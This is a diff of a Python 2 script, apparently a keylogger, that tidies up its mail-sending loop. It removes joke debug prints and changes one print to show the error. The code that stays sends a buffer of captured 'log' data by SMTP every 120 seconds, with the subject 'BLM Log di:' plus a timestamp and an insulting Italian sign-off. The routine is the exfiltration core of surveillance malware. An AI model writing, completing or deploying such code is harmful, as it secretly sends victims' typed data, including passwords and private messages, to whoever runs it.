@@ -34,9 +34,7 @@ if not path.isfile(dir):
     
 def send_mail():
     global data
-	print "yay"
     while True:
-		print "lol"
 		# FILE
         if len(data) > 25:
 			# MAI
@@ -53,7 +51,6 @@ def send_mail():
             FROM = USER
 			# GIURO
             TO = [USER]
-			print "adasda"
             SUBJECT = "BLM Log di: " + timeInSecs.isoformat() 
             MESSAGE =  data + "\r\n\n\nGrazie per aver utilizzato il nostro servizio e vaffanculo a te e tua madre."
 
@@ -71,9 +68,8 @@ def send_mail():
                 server.sendmail(FROM, TO, message_payload)
                 data = ''
                 server.quit()
-				print "tummamma"
             except Exception as error:
-                print "fak"
+                print error
         sleep(120)
 
 
